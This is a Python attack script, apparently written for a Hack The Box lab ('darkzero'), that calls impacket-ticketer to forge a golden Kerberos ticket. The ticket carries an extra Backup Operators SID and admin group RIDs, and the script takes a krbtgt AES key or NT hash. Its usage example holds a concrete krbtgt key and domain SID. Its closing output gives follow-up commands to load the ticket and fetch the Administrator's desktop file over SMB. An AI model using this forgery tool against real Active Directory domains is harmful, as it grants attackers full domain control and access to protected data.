#!/usr/bin/env python3
"""Forge EXT golden TGT with ExtraSID Backup Operators (S-1-5-32-551).

Requires: impacket (ticketer), AES256 or NT hash of EXT krbtgt.
Clock must match DC within skew.

Example:
  python3 forge_bo_extrasid.py \\
    --krbtgt-aes 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6 \\
    --domain darkzero.ext \\
    --domain-sid S-1-5-21-2850783758-1231244658-2051857529 \\
    --user celia --user-id 1109 \\
    --extra-sid S-1-5-32-551 \\
    --out /tmp/celia_bo.ccache
"""
from __future__ import annotations

import argparse
import subprocess
import sys


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--krbtgt-aes", help="AES256 key of EXT krbtgt (hex)")
    p.add_argument("--krbtgt-nthash", help="NT hash of EXT krbtgt (hex) — may hit ETYPE_NOSUPP on modern DC")
    p.add_argument("--domain", default="darkzero.ext")
    p.add_argument("--domain-sid", required=True, help="EXT domain SID")
    p.add_argument("--user", default="celia")
    p.add_argument("--user-id", type=int, default=1109)
    p.add_argument("--groups", default="512,519,513", help="comma RID groups in PAC")
    p.add_argument(
        "--extra-sid",
        default="S-1-5-32-551",
        help="ExtraSID(s), comma-separated. BO=S-1-5-32-551",
    )
    p.add_argument("--out", default=None, help="optional rename path for ccache (ticketer writes USER.ccache)")
    p.add_argument("--ticketer", default="impacket-ticketer", help="ticketer binary")
    args = p.parse_args()

    if not args.krbtgt_aes and not args.krbtgt_nthash:
        p.error("need --krbtgt-aes or --krbtgt-nthash")

    cmd = [
        args.ticketer,
        "-domain-sid",
        args.domain_sid,
        "-domain",
        args.domain,
        "-user-id",
        str(args.user_id),
        "-groups",
        args.groups,
        "-extra-sid",
        args.extra_sid,
    ]
    if args.krbtgt_aes:
        cmd += ["-aesKey", args.krbtgt_aes]
    else:
        cmd += ["-nthash", args.krbtgt_nthash]
    cmd.append(args.user)

    print("[*] running:", " ".join(cmd), file=sys.stderr)
    r = subprocess.run(cmd)
    if r.returncode != 0:
        return r.returncode

    default_cc = f"{args.user}.ccache"
    if args.out and args.out != default_cc:
        import shutil

        shutil.move(default_cc, args.out)
        print(f"[+] ticket: {args.out}")
    else:
        print(f"[+] ticket: {default_cc}")

    print(
        """
Next (on host with good clock/DNS toward DCs, e.g. SRV01):
  export KRB5CCNAME=FILE:/path/to/ccache
  # krb5: rdns=false, both realms, see krb5-dual-realm.conf.example
  kvno cifs/dc01.darkzero.htb@DARKZERO.HTB
  python3 smb_bo_get.py --path 'Users\\\\Administrator\\\\Desktop\\\\root.txt' --out root.txt
"""
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
